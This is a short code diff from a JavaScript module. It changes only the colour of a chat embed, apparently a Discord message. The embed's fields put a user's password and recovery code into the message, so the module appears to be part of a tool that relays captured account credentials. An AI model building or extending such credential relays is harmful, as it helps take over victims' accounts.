@@ -76,7 +76,7 @@ module.exports = {
                                 { name: "Password", value: "```" + data.password + "```", inline: false },
                                 { name: "Recovery Code", value: "```" + data.recoveryCode + "```", inline: false },
                             ],
-                            color: 0xb2c7e0, 
+                            color: 0xF59E0B, 
                         },
                     ],
                     components: [
